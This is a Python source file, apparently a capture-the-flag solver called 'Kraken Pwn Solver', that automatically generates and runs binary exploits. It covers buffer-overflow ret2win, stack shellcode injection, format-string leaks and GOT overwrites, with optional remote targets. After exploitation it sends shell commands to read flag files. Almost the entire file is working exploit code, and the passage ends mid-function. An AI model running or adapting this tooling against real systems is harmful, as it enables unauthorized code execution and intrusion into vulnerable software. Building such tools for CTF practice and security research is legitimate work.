#!/usr/bin/env python3
"""Kraken Pwn Solver -- generates and runs binary exploits.

Comprehensive binary exploitation engine that goes beyond detection to
actually generate, execute, and extract flags from vulnerable binaries.

Strategies (tried in order):
  1. Direct execution -- Run binary with common inputs
  2. ret2win     -- Jump to win/flag/shell function
  3. ret2shellcode -- Inject + execute shellcode (NX disabled)
  4. Format string -- %n write-what-where for GOT overwrite + canary leak
  5. ret2libc    -- Leak libc via GOT, build system("/bin/sh") chain
  6. ROP chain   -- Assemble gadgets for execve/system
  7. Stack pivot  -- Limited overflow -> pivot to larger controlled buffer
  8. One-gadget  -- Single libc gadget for shell (simplest ret2libc variant)
  9. ret2dlresolve -- dl_resolve attack, no libc needed
 10. SROP         -- Sigreturn-Oriented Programming
 11. ret2csu      -- __libc_csu_init universal gadget
 12. PIE partial  -- Partial overwrite for PIE binaries
 13. Canary brute -- Byte-by-byte canary brute-force for forking servers

Usage:
  python3 auto_pwn_solve.py <binary> [--source SRC] [--prefix PREFIX]
  python3 auto_pwn_solve.py <binary> --remote-host HOST --remote-port PORT
  python3 auto_pwn_solve.py <binary> --libc ./libc.so.6

Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# pwntools import with graceful degradation
# ---------------------------------------------------------------------------
os.environ.setdefault("PWNLIB_NOTERM", "1")
os.environ.setdefault("PWNLIB_SILENT", "1")

PWNTOOLS_AVAILABLE = False
try:
    from pwn import (
        ELF,
        ROP,
        asm,
        constants,
        context,
        cyclic,
        cyclic_find,
        flat,
        p32,
        p64,
        process,
        remote,
        shellcraft,
        u32,
        u64,
    )

    PWNTOOLS_AVAILABLE = True
except ImportError:
    pass

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")

WIN_FUNCTION_NAMES = [
    "win", "flag", "get_flag", "print_flag", "read_flag", "cat_flag",
    "shell", "give_shell", "spawn_shell", "backdoor", "secret",
    "getflag", "printflag", "readflag", "getFlag", "printFlag",
    "open_flag", "show_flag", "vuln", "target",
]

# Patterns that suggest format string vulnerability in source code
FMTSTR_SOURCE_PATTERNS = [
    r"printf\s*\(\s*buf",
    r"printf\s*\(\s*buffer",
    r"printf\s*\(\s*input",
    r"printf\s*\(\s*str\b",
    r"printf\s*\(\s*argv",
    r"printf\s*\(\s*name",
    r"printf\s*\(\s*s\s*\)",
    r"fprintf\s*\(\s*stdout\s*,\s*buf",
    r"sprintf\s*\(\s*[^,]+,\s*buf",
]

# Flag-reading shell commands to try after exploitation
FLAG_CMDS = [
    b"cat flag* 2>/dev/null",
    b"cat flag.txt 2>/dev/null",
    b"cat /flag* 2>/dev/null",
    b"cat /flag.txt 2>/dev/null",
    b"cat /home/*/flag* 2>/dev/null",
    b"find / -name 'flag*' -exec cat {} \\; 2>/dev/null",
    b"echo $FLAG 2>/dev/null",
    b"ls -la 2>/dev/null",
]

# Common libc offsets for when no libc file is available
# (glibc 2.31, 2.35, 2.36 etc.)
COMMON_LIBC_OFFSETS = [
    # (puts_offset, system_offset, binsh_offset) for common glibc versions
    (0x80970, 0x4f420, 0x1b3e9a),   # glibc 2.31 amd64
    (0x80e50, 0x50d70, 0x1d8698),   # glibc 2.35 amd64
    (0x80ed0, 0x50d60, 0x1d8698),   # glibc 2.35 amd64 alt
    (0x77980, 0x48170, 0x1a5439),   # glibc 2.27 amd64
    (0x6f6a0, 0x453a0, 0x18ce57),   # glibc 2.23 amd64
    (0x67b00, 0x3d200, 0x17e0cf),   # glibc 2.19 amd64
    (0x87bd0, 0x58740, 0x1d8678),   # glibc 2.38/2.39 amd64
    (0x5f150, 0x3a950, 0x15902b),   # glibc 2.23 i386
    (0x67360, 0x3cd10, 0x17b8cf),   # glibc 2.27 i386
]


# ---------------------------------------------------------------------------
# Flag scanning
# ---------------------------------------------------------------------------
def _scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text*."""
    flags: list[str] = []
    if flag_format:
        try:
            pat = re.compile(flag_format)
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    # Deduplicate preserving order
    seen = set()
    unique = []
    for f in flags:
        if f not in seen:
            seen.add(f)
            unique.append(f)
    return unique


def _best_flag(flags: list[str]) -> str | None:
    """Pick the best flag from a list of candidates."""
    if not flags:
        return None
    return max(flags, key=len)


# ---------------------------------------------------------------------------
# Binary analysis utilities
# ---------------------------------------------------------------------------
def _run_cmd(cmd: list[str], timeout: int = 30) -> tuple[str, str, int]:
    """Run a command, return (stdout, stderr, returncode)."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        return proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except FileNotFoundError:
        return "", f"command not found: {cmd[0]}", -1
    except Exception as e:
        return "", str(e), -1


def _ensure_executable(path: str) -> None:
    """Make sure a binary is executable."""
    if not os.access(path, os.X_OK):
        try:
            os.chmod(path, 0o755)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# PwnSolver class
# ---------------------------------------------------------------------------
class PwnSolver:
    """Complete binary exploitation solver."""

    def __init__(
        self,
        binary_path: str,
        source_path: str | None = None,
        remote_host: str | None = None,
        remote_port: int | None = None,
        prefix: str = "flag",
        flag_format: str = "",
        libc_path: str | None = None,
        timeout: int = 30,
    ):
        self.binary = os.path.abspath(binary_path)
        self.source = source_path
        self.remote = (remote_host, int(remote_port)) if remote_host and remote_port else None
        self.prefix = prefix
        self.flag_format = flag_format
        self.libc_path = libc_path
        self.timeout = timeout

        # Analysis results (populated by analyze())
        self.elf = None
        self.rop = None
        self.libc_elf = None
        self.protections: dict = {}
        self.arch: str = "amd64"
        self.bits: int = 64
        self.win_functions: dict[str, int] = {}
        self.offset: int | None = None
        self.source_code: str = ""
        self.has_fmtstr_vuln: bool = False
        self.has_fork: bool = False
        self.leaked_canary: int | None = None

        # Load source code if available
        if self.source and os.path.isfile(self.source):
            try:
                with open(self.source, "r", errors="replace") as f:
                    self.source_code = f.read()
            except OSError:
                pass

    # -----------------------------------------------------------------------
    # Analysis
    # -----------------------------------------------------------------------
    def analyze(self) -> bool:
        """Run checksec, find vulns, determine exploit strategy.
        Returns True if binary was loaded successfully."""
        print(f"[*] Analyzing binary: {self.binary}")

        _ensure_executable(self.binary)

        try:
            self.elf = ELF(self.binary, checksec=False)
        except Exception as exc:
            print(f"[-] Failed to load ELF: {exc}")
            return False

        self.arch = self.elf.arch
        self.bits = self.elf.bits
        context.binary = self.elf
        context.log_level = "error"

        self.protections = {
            "arch": self.elf.arch,
            "bits": self.elf.bits,
            "nx": self.elf.nx,
            "pie": self.elf.pie,
            "canary": self.elf.canary,
            "relro": getattr(self.elf, "relro", "Unknown"),
        }

        nx_str = "Enabled" if self.protections["nx"] else "DISABLED"
        pie_str = "Enabled" if self.protections["pie"] else "Disabled"
        can_str = "Enabled" if self.protections["canary"] else "Disabled"
        relro_str = str(self.protections["relro"])

        print(f"[*] Checksec: NX={nx_str}, PIE={pie_str}, RELRO={relro_str}, Canary={can_str}")
        print(f"[*] Architecture: {self.arch} ({self.bits}-bit)")

        # Load libc if provided
        if self.libc_path and os.path.isfile(self.libc_path):
            try:
                self.libc_elf = ELF(self.libc_path, checksec=False)
                print(f"[+] Loaded libc: {self.libc_path}")
            except Exception as exc:
                print(f"[-] Failed to load libc: {exc}")

        # Build ROP object
        try:
            self.rop = ROP(self.elf)
        except Exception:
            pass

        # Find win functions
        self._find_win_functions()

        # Detect format string vulnerability
        self._detect_fmtstr_source()

        # Detect fork() usage
        self._detect_fork()

        # Find buffer overflow offset
        # If canary: still try offset from source (we may leak/bruteforce canary)
        if not self.protections.get("canary"):
            self._find_offset()
        else:
            print("[!] Stack canary detected - attempting offset from source anyway")
            offset = self._offset_from_source()
            if offset is not None:
                self.offset = offset
                print(f"[+] Offset from source analysis (pre-canary): {offset}")
            else:
                # Try GDB-based approach even with canary
                self._find_offset()

        return True

    def _find_win_functions(self) -> None:
        """Search for win/flag/shell functions in binary symbols."""
        print("[*] Searching for win/flag/shell functions...")
        if not self.elf:
            return

        all_symbols = dict(self.elf.symbols)
        if hasattr(self.elf, "plt"):
            for name, addr in self.elf.plt.items():
                if name not in all_symbols:
                    all_symbols[name] = addr

        for name, addr in all_symbols.items():
            name_lower = name.lower()
            # Skip source file names, PLT prefixed names, and zero-address symbols
            if addr == 0:
                continue
            if "." in name and (name.endswith(".c") or name.endswith(".o") or name.startswith("plt.")):
                continue
            # Skip compiler/linker internals
            if name.startswith(("_", ".")) and name not in ("_start",):
                continue
            for win in WIN_FUNCTION_NAMES:
                if win in name_lower and name not in ("__libc_start_main",):
                    # Filter out PLT stubs for system/execve (those aren't win funcs)
                    if name in ("system", "execve") and addr in (self.elf.plt.get("system"), self.elf.plt.get("execve")):
                        continue
                    self.win_functions[name] = addr
                    print(f"    [+] Found win function: {name} @ {hex(addr)}")
                    break

        if not self.win_functions:
            print("    [-] No obvious win functions found")

    def _detect_fmtstr_source(self) -> None:
        """Check source code for format string vulnerabilities."""
        if not self.source_code:
            return
        for pat in FMTSTR_SOURCE_PATTERNS:
            if re.search(pat, self.source_code):
                self.has_fmtstr_vuln = True
                print("[+] Source code suggests format string vulnerability")
                return

    def _detect_fork(self) -> None:
        """Detect if binary uses fork() (important for canary brute-force)."""
        if not self.elf:
            return
        # Check PLT/imports for fork
        if "fork" in getattr(self.elf, 'plt', {}):
            self.has_fork = True
            print("[+] Binary uses fork() - canary brute-force possible")
            return
        # Check symbols
        for sym in self.elf.symbols:
            if sym in ("fork", "__fork"):
                self.has_fork = True
                print("[+] Binary uses fork() - canary brute-force possible")
                return
        # Check source code
        if self.source_code and re.search(r'\bfork\s*\(', self.source_code):
            self.has_fork = True
            print("[+] Source code uses fork() - canary brute-force possible")

    def _find_offset(self) -> None:
        """Determine buffer overflow offset using cyclic pattern."""
        print("[*] Detecting buffer overflow offset...")

        # Method 1: Try to infer from source code
        offset = self._offset_from_source()
        if offset is not None:
            self.offset = offset
            print(f"[+] Offset from source analysis: {offset}")
            return

        # Method 2: Cyclic pattern + crash analysis
        offset = self._offset_from_cyclic()
        if offset is not None:
            self.offset = offset
            print(f"[+] Offset from cyclic pattern: {offset}")
            return

        # Method 3: GDB-based offset detection
        offset = self._offset_from_gdb()
        if offset is not None:
            self.offset = offset
            print(f"[+] Offset from GDB analysis: {offset}")
            return

        # Method 4: Try common buffer sizes (brute-force with win functions)
        offset = self._offset_from_common_sizes()
        if offset is not None:
            self.offset = offset
            print(f"[+] Offset from brute-force: {offset}")
            return

        print("[-] Could not determine overflow offset")

    def _offset_from_source(self) -> int | None:
        """Try to infer buffer size from source code."""
        if not self.source_code:
            return None

        # Look for char buf[N] or char buffer[N] declarations
        buf_matches = re.findall(
            r"char\s+\w+\s*\[\s*(\d+)\s*\]", self.source_code,
        )
        if not buf_matches:
            return None

        # Use the largest buffer found (most likely the vulnerable one)
        buf_size = max(int(m) for m in buf_matches)

        # Offset = buffer size + saved rbp (8 for 64-bit, 4 for 32-bit)
        if self.bits == 64:
            return buf_size + 8
        return buf_size + 4

    def _offset_from_cyclic(self) -> int | None:
        """Send cyclic pattern and detect crash offset from corefile."""
        pattern_len = 512
        try:
            pattern = cyclic(pattern_len)
        except Exception:
            return None

        try:
            proc = process(self.binary, level="error")
            proc.sendline(pattern)
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.close()
            except Exception:
                pass
            return None

        try:
            core = proc.corefile
            if core is None:
                return None

            crash_addr = core.fault_addr
            if crash_addr is None:
                for reg in ("pc", "rip", "eip"):
                    crash_addr = core.registers.get(reg)
                    if crash_addr:
                        break

            if crash_addr is None:
                return None

            # Try 4-byte pack first (cyclic default)
            try:
                crash_bytes = struct.pack("<I", crash_addr & 0xFFFFFFFF)
                offset = cyclic_find(crash_bytes)
                if offset != -1:
                    return offset
            except Exception:
                pass

            return None
        except Exception:
            return None
        finally:
            try:
                proc.close()
            except Exception:
                pass
            # Clean up core files
            for f in os.listdir("."):
                if f.startswith("core"):
                    try:
                        os.remove(f)
                    except OSError:
                        pass

    def _offset_from_gdb(self) -> int | None:
        """Use GDB to detect crash offset from cyclic pattern.

        When a buffer overflow overwrites the return address, the crash may
        happen on the ``ret`` instruction (RIP points inside the function)
        and the overwritten value sits at $rsp.  We therefore read BOTH
        the crash RIP *and* the 8/4 bytes at $rsp, trying cyclic_find on
        each.
        """
        gdb_path = shutil.which("gdb")
        if not gdb_path:
            return None

        print("[*] Trying GDB-based offset detection...")

        pattern_len = 512
        try:
            pattern = cyclic(pattern_len)
        except Exception:
            return None

        pattern_file = tempfile.mktemp(suffix="_cyclic.txt")
        try:
            with open(pattern_file, "wb") as f:
                f.write(pattern + b"\n")

            # Run binary under GDB, read registers and memory at crash
            if self.bits == 64:
                gdb_cmds = [
                    "set pagination off",
                    "set confirm off",
                    f"run < {pattern_file}",
                    "info registers rip rsp",
                    "x/1gx $rsp",
                ]
            else:
                gdb_cmds = [
                    "set pagination off",
                    "set confirm off",
                    f"run < {pattern_file}",
                    "info registers eip esp",
                    "x/1wx $esp",
                ]

            cmd = ["gdb", "-batch"]
            for c in gdb_cmds:
                cmd.extend(["-ex", c])
            cmd.append(self.binary)

            stdout, stderr, rc = _run_cmd(cmd, timeout=15)
            combined = stdout + "\n" + stderr

            # ---- Try to extract crash value from $rsp content ----
            # GDB output for `x/1gx $rsp` looks like:
            #   0x7ffe...: 0x6161616c6161616b
            rsp_val_match = re.search(
                r"0x[0-9a-f]+:\s+(0x[0-9a-f]+)",
                combined.split("x/1" if "x/1" in combined else "NOMATCH")[-1]
                if "x/1" in combined else "",
            )
            # Simpler fallback: look at last hex value printed
            if not rsp_val_match:
                all_hex = re.findall(r"(0x[0-9a-f]{8,16})", combined)
                # The value from `x/` is typically the last or second-to-last
                rsp_val_match_val = None
                for h in reversed(all_hex):
                    v = int(h, 16)
                    # Check if it looks like a cyclic pattern (ASCII 'a'-'z')
                    raw = struct.pack("<Q" if self.bits == 64 else "<I", v)
                    if all(0x60 <= b <= 0x7b for b in raw[:4]):
                        rsp_val_match_val = v
                        break
            else:
                rsp_val_match_val = int(rsp_val_match.group(1), 16)

            # Try finding offset from the value at $rsp
            if rsp_val_match_val is not None:
                try:
                    crash_bytes = struct.pack("<I", rsp_val_match_val & 0xFFFFFFFF)
                    offset = cyclic_find(crash_bytes)
                    if offset != -1:
                        return offset
                except Exception:
                    pass

            # ---- Fallback: try crash RIP/EIP directly ----
            if self.bits == 64:
                rip_match = re.search(r"rip\s+(0x[0-9a-f]+)", combined)
            else:
                rip_match = re.search(r"eip\s+(0x[0-9a-f]+)", combined)

            if rip_match:
                crash_addr = int(rip_match.group(1), 16)
                try:
                    crash_bytes = struct.pack("<I", crash_addr & 0xFFFFFFFF)
                    offset = cyclic_find(crash_bytes)
                    if offset != -1:
                        return offset
                except Exception:
                    pass

            return None

        except Exception as exc:
            print(f"[-] GDB offset detection failed: {exc}")
            return None
        finally:
            for f in [pattern_file]:
                try:
                    os.remove(f)
                except OSError:
                    pass

    def _offset_from_common_sizes(self) -> int | None:
        """Try common buffer sizes to find the right offset."""
        if not self.win_functions or self.protections.get("pie"):
            return None

        # Pick a win function to test against
        target = list(self.win_functions.values())[0]
        pack = p64 if self.bits == 64 else p32

        # Common buffer sizes + saved rbp/ebp
        offsets_to_try = []
        for buf_size in [16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64, 72, 80, 96, 100, 104, 108, 112, 128, 136, 256, 264]:
            offsets_to_try.append(buf_size)

        for offset in offsets_to_try:
            payload = b"A" * offset

            # Add ret gadget for alignment on 64-bit
            if self.bits == 64:
                ret_addr = self._find_ret_gadget()
                if ret_addr:
                    payload += pack(ret_addr)

            payload += pack(target)

            try:
                proc = process(self.binary, level="error")
                proc.sendline(payload)
                try:
                    output = proc.recvall(timeout=3)
                except Exception:
                    try:
                        output = proc.recv(timeout=2)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                try:
                    proc.close()
                except Exception:
                    pass
                continue

            text = output.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            if flags:
                # Found a flag -- this offset works!
                return offset

        return None

    # -----------------------------------------------------------------------
    # Gadget finding helpers
    # -----------------------------------------------------------------------
    def _find_ret_gadget(self) -> int | None:
        """Find a simple 'ret' gadget for stack alignment."""
        if self.rop:
            try:
                ret = self.rop.find_gadget(["ret"])
                if ret:
                    return ret.address
            except Exception:
                pass
        return None

    def _find_pop_rdi_ret(self) -> int | None:
        """Find 'pop rdi; ret' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["pop rdi", "ret"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        # Fallback: search with ropper
        return self._ropper_search("pop rdi")

    def _find_pop_rsi_ret(self) -> int | None:
        """Find 'pop rsi; ...; ret' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["pop rsi", "pop r15", "ret"])
                if gadget:
                    return gadget.address
                gadget = self.rop.find_gadget(["pop rsi", "ret"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        return self._ropper_search("pop rsi")

    def _find_pop_rdx_ret(self) -> int | None:
        """Find 'pop rdx; ...; ret' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["pop rdx", "ret"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        return self._ropper_search("pop rdx")

    def _find_pop_rax_ret(self) -> int | None:
        """Find 'pop rax; ret' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["pop rax", "ret"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        return self._ropper_search("pop rax")

    def _find_syscall_ret(self) -> int | None:
        """Find 'syscall; ret' or 'syscall' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["syscall", "ret"])
                if gadget:
                    return gadget.address
                gadget = self.rop.find_gadget(["syscall"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        return self._ropper_search("syscall")

    def _find_int80_ret(self) -> int | None:
        """Find 'int 0x80; ret' or 'int 0x80' gadget."""
        if self.rop:
            try:
                gadget = self.rop.find_gadget(["int 0x80", "ret"])
                if gadget:
                    return gadget.address
                gadget = self.rop.find_gadget(["int 0x80"])
                if gadget:
                    return gadget.address
            except Exception:
                pass
        return self._ropper_search("int 0x80")

    def _ropper_search(self, pattern: str) -> int | None:
        """Search for a gadget using ropper CLI."""
        try:
            result = subprocess.run(
                ["ropper", "--file", self.binary, "--search", pattern],
                capture_output=True, text=True, timeout=15,
            )
            # Strip ANSI codes
            clean = re.sub(r"\x1b\[[0-9;]*m", "", result.stdout)
            for line in clean.splitlines():
                m = re.match(r"\s*(0x[0-9a-fA-F]+):\s*(.+)", line)
                if m and "ret" in m.group(2).lower():
                    return int(m.group(1), 16)
        except Exception:
            pass
        return None

    # -----------------------------------------------------------------------
    # Target connection helper
    # -----------------------------------------------------------------------
    def _get_target(self):
        """Return a process or remote connection to the target."""
        if self.remote:
            return remote(self.remote[0], self.remote[1])
        return process(self.binary, level="error")

    def _interact_and_extract(self, proc, extra_cmds: list[bytes] | None = None) -> str | None:
        """Send shell commands after exploitation and extract flags.

        This is the CRITICAL flag extraction function. After a successful exploit
        gives us a shell, we need to find and read the flag.
        """
        try:
            # Small delay to let shell initialize
            time.sleep(0.3)

            # Try sending flag-reading commands
            cmds = list(extra_cmds or [])
            cmds.extend(FLAG_CMDS)

            all_output = b""
            for cmd in cmds:
                try:
                    proc.sendline(cmd)
                    time.sleep(0.2)
                except Exception:
                    break
                # Try to receive after each command
                try:
                    chunk = proc.recv(timeout=1)
                    all_output += chunk
                    # Check immediately if we got a flag
                    text = all_output.decode("utf-8", errors="replace")
                    flags = _scan_flags(text, self.flag_format)
                    if flags:
                        try:
                            proc.close()
                        except Exception:
                            pass
                        return _best_flag(flags)
                except Exception:
                    pass

            try:
                proc.sendline(b"exit")
            except Exception:
                pass

            try:
                remaining = proc.recvall(timeout=self.timeout)
                all_output += remaining
            except Exception:
                try:
                    remaining = proc.recv(timeout=3)
                    all_output += remaining
                except Exception:
                    pass

            text = all_output.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            return _best_flag(flags)
        except Exception:
            return None
        finally:
            try:
                proc.close()
            except Exception:
                pass

    def _run_payload_and_extract(self, payload: bytes, recv_first: bool = False,
                                  send_after: list[bytes] | None = None,
                                  shell_mode: bool = False) -> str | None:
        """Send a payload to the binary, optionally interact, and extract flag.

        If shell_mode is True, after sending payload we assume we got a shell
        and try various flag-reading commands.
        """
        try:
            proc = self._get_target()
        except Exception as exc:
            print(f"[-] Failed to start target: {exc}")
            return None

        try:
            if recv_first:
                try:
                    proc.recv(timeout=2)
                except Exception:
                    pass

            proc.sendline(payload)

            if shell_mode:
                # We expect a shell, so use full flag extraction
                return self._interact_and_extract(proc, send_after)

            if send_after:
                for cmd in send_after:
                    try:
                        proc.sendline(cmd)
                    except Exception:
                        break

            try:
                output = proc.recvall(timeout=self.timeout)
            except Exception:
                try:
                    output = proc.recv(timeout=3)
                except Exception:
                    output = b""

            text = output.decode("utf-8", errors="replace")

            # Print output preview
            lines = text.splitlines()
            if lines:
                print(f"[*] Output ({len(text)} chars):")
                for line in lines[:15]:
                    print(f"    | {line}")

            flags = _scan_flags(text, self.flag_format)
            if flags:
                return _best_flag(flags)

            # If no flag found in direct output, maybe we got a shell
            # Try flag extraction commands
            if len(text) < 5 or "sh" in text.lower() or "$" in text or "#" in text:
                try:
                    proc2 = self._get_target()
                    proc2.sendline(payload)
                    return self._interact_and_extract(proc2, send_after)
                except Exception:
                    pass

            return None
        except Exception as exc:
            print(f"[-] Exploitation error: {exc}")
            return None
        finally:
            try:
                proc.close()
            except Exception:
                pass

    # -----------------------------------------------------------------------
    # Strategy 1: ret2win
    # -----------------------------------------------------------------------
    def try_ret2win(self) -> str | None:
        """Try to jump to a win function via buffer overflow."""
        if not self.win_functions:
            print("[-] ret2win: No win functions found")
            return None

        if self.protections.get("pie"):
            print("[-] ret2win: PIE enabled - static addresses won't work")
            return None

        if self.offset is None:
            print("[-] ret2win: No overflow offset found")
            return None

        pack = p64 if self.bits == 64 else p32
        ret_gadget = self._find_ret_gadget()

        # Prioritize dedicated win functions over system/execve
        priority = [
            "win", "flag", "get_flag", "print_flag", "cat_flag",
            "read_flag", "backdoor", "secret", "give_shell",
            "spawn_shell", "shell", "getflag", "printflag", "readflag",
            "open_flag", "show_flag", "vuln", "target",
        ]

        sorted_targets = []
        for pname in priority:
            for fname, addr in self.win_functions.items():
                if pname in fname.lower() and (fname, addr) not in sorted_targets:
                    sorted_targets.append((fname, addr))
        for fname, addr in self.win_functions.items():
            if (fname, addr) not in sorted_targets:
                sorted_targets.append((fname, addr))

        for fname, addr in sorted_targets:
            print(f"[*] Trying ret2win -> {fname} @ {hex(addr)}")

            payload = b"A" * self.offset

            # On x86-64, add ret gadget for 16-byte stack alignment
            if self.bits == 64 and ret_gadget:
                payload += pack(ret_gadget)

            payload += pack(addr)

            flag = self._run_payload_and_extract(payload)
            if flag:
                print(f"[+] ret2win succeeded via {fname}!")
                return flag

            # Also try without ret alignment gadget
            if self.bits == 64 and ret_gadget:
                payload_no_align = b"A" * self.offset + pack(addr)
                flag = self._run_payload_and_extract(payload_no_align)
                if flag:
                    print(f"[+] ret2win succeeded via {fname} (no alignment)!")
                    return flag

        print("[-] ret2win: No strategy yielded a flag")
        return None

    # -----------------------------------------------------------------------
    # Strategy 2: ret2shellcode
    # -----------------------------------------------------------------------
    def try_ret2shellcode(self) -> str | None:
        """Inject and execute shellcode (requires NX disabled)."""
        if self.protections.get("nx"):
            print("[-] ret2shellcode: NX is enabled - cannot execute stack shellcode")
            return None

        if self.offset is None:
            print("[-] ret2shellcode: No overflow offset found")
            return None

        if self.protections.get("pie"):
            print("[-] ret2shellcode: PIE enabled - need a leak for shellcode address")
            return None

        print("[*] Trying ret2shellcode (NX disabled)...")

        # Generate shellcode for flag reading
        try:
            if self.bits == 64:
                context.arch = "amd64"
                # Try reading common flag file locations
                sc = asm(shellcraft.amd64.linux.cat("flag.txt"))
                if not sc:
                    sc = asm(shellcraft.amd64.linux.sh())
            else:
                context.arch = "i386"
                sc = asm(shellcraft.i386.linux.cat("flag.txt"))
                if not sc:
                    sc = asm(shellcraft.i386.linux.sh())
        except Exception as exc:
            print(f"[-] Shellcode generation failed: {exc}")
            return None

        # Strategy A: NOP sled + shellcode in buffer, jump to known address
        # For non-PIE binaries, we might know the buffer address
        # Strategy B: jmp esp gadget (return to stack)
        jmp_esp = self._ropper_search("jmp esp")
        if not jmp_esp and self.bits == 32:
            jmp_esp = self._ropper_search("call esp")

        pack = p64 if self.bits == 64 else p32

        if jmp_esp:
            print(f"[+] Found jmp/call esp gadget @ {hex(jmp_esp)}")
            # Payload: padding + jmp_esp + shellcode
            payload = b"A" * self.offset + pack(jmp_esp) + b"\x90" * 16 + sc

            flag = self._run_payload_and_extract(
                payload,
                send_after=[
                    b"cat flag* 2>/dev/null",
                    b"cat /flag* 2>/dev/null",
                ],
            )
            if flag:
                print("[+] ret2shellcode via jmp esp succeeded!")
                return flag

        # Strategy C: Put shellcode before return address, use known stack addr
        # This is less reliable but worth trying
        nop_sled = b"\x90" * 64
        payload_with_nop = nop_sled + sc + b"A" * (self.offset - len(nop_sled) - len(sc))
        if len(payload_with_nop) < self.offset:
            payload_with_nop += b"A" * (self.offset - len(payload_with_nop))

        # Try some common stack addresses for non-PIE 32-bit
        if self.bits == 32 and not self.protections.get("pie"):
            stack_addrs = [0xffffd000 + i * 0x100 for i in range(16)]
            for sa in stack_addrs:
                payload = nop_sled + sc
                pad_len = self.offset - len(payload)
                if pad_len > 0:
                    payload += b"A" * pad_len
                payload += p32(sa)
                flag = self._run_payload_and_extract(payload)
                if flag:
                    print(f"[+] ret2shellcode via stack spray @ {hex(sa)} succeeded!")
                    return flag

        print("[-] ret2shellcode: No strategy yielded a flag")
        return None

    # -----------------------------------------------------------------------
    # Strategy 3: Format string exploitation
    # -----------------------------------------------------------------------
    def try_format_string(self) -> str | None:
        """Exploit format string vulnerability to read stack or overwrite GOT."""
        print("[*] Testing for format string vulnerability...")

        # First, detect if the binary has a format string vuln
        probe = b"%p.%p.%p.%p.%p.%p.%p.%p"
        try:
            proc = process(self.binary, level="error")
            proc.sendline(probe)
            try:
                output = proc.recvall(timeout=5)
            except Exception:
                try:
                    output = proc.recv(timeout=3)
                except Exception:
                    output = b""
            proc.close()
        except Exception:
            return None

        text = output.decode("utf-8", errors="replace")
        hex_leaks = re.findall(r"0x[0-9a-fA-F]+", text)

        if len(hex_leaks) < 2:
            if not self.has_fmtstr_vuln:
                print("[-] format string: No vulnerability detected")
                return None

        print(f"[+] Format string vulnerability detected! ({len(hex_leaks)} leaks)")

        # Strategy A: Read flag directly from stack using %s or %x
        flag = self._fmtstr_stack_read()
        if flag:
            print("[+] Format string stack read succeeded!")
            return flag

        # Strategy B: Leak canary via format string, then overflow
        if self.protections.get("canary") and self.win_functions:
            flag = self._fmtstr_canary_leak_and_overflow()
            if flag:
                print("[+] Format string canary leak + overflow succeeded!")
                return flag

        # Strategy C: GOT overwrite (printf GOT -> win/system)
        # Note: PIE binaries can still be exploited via format string if we can
        # leak the PIE base first (requires a looping binary, typically remote)
        if not self.protections.get("pie") or self.remote:
            # Try win function overwrite
            if self.win_functions:
                flag = self._fmtstr_got_overwrite()
                if flag:
                    print("[+] Format string GOT overwrite succeeded!")
                    return flag

            # Try printf@GOT -> system, then send "/bin/sh"
            flag = self._fmtstr_got_system_overwrite()
            if flag:
                print("[+] Format string GOT->system overwrite succeeded!")
                return flag

        print("[-] format string: No strategy yielded a flag")
        return None

    def _fmtstr_stack_read(self) -> str | None:
        """Read stack contents looking for flag using format specifiers."""
        # Try reading stack positions as strings and hex
        for i in range(1, 50):
            # Use %N$s to read string at position N
            probe = f"%{i}$s".encode()
            try:
                proc = process(self.binary, level="error")
                proc.sendline(probe)
                try:
                    output = proc.recvall(timeout=3)
                except Exception:
                    try:
                        output = proc.recv(timeout=2)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")
            flags = _scan_flags(text, self.flag_format)
            if flags:
                return _best_flag(flags)

        # Also try reading hex values and decode
        hex_dump = b""
        for i in range(1, 30):
            probe = f"%{i}$p".encode()
            try:
                proc = process(self.binary, level="error")
                proc.sendline(probe)
                try:
                    output = proc.recvall(timeout=3)
                except Exception:
                    try:
                        output = proc.recv(timeout=2)
                    except Exception:
                        output = b""
                proc.close()
            except Exception:
                continue

            text = output.decode("utf-8", errors="replace")

            # Check if any of the hex values decode to flag characters
            for m in re.finditer(r"0x([0-9a-fA-F]+)", text):
                try:
                    hex_val = m.group(1)
                    if len(hex_val) % 2:
                        hex_val = "0" + hex_val
                    decoded = bytes.fromhex(hex_val)
                    # Check both endianness
                    for candidate in [decoded, decoded[::-1]]:
                        candidate_str = candidate.decode("utf-8", errors="replace")
                        flags = _scan_flags(candidate_str, self.flag_format)
                        if flags:
                            return _best_flag(flags)
                except Exception:
                    continue

        return None

    def _fmtstr_canary_leak_and_overflow(self) -> str | None:
        """Leak stack canary via format string, then overflow with canary in place.

        Canary characteristics: 8 bytes (64-bit) or 4 bytes (32-bit), lowest byte is \\x00.
        We spray %N$p for N in range(1,60) to find it.
        """
        if not self.elf or not self.win_functions:
            return None

        print("[*] Attempting canary leak via format string...")

        canary = None
        canary_pos = None

        for i in range(1, 60):
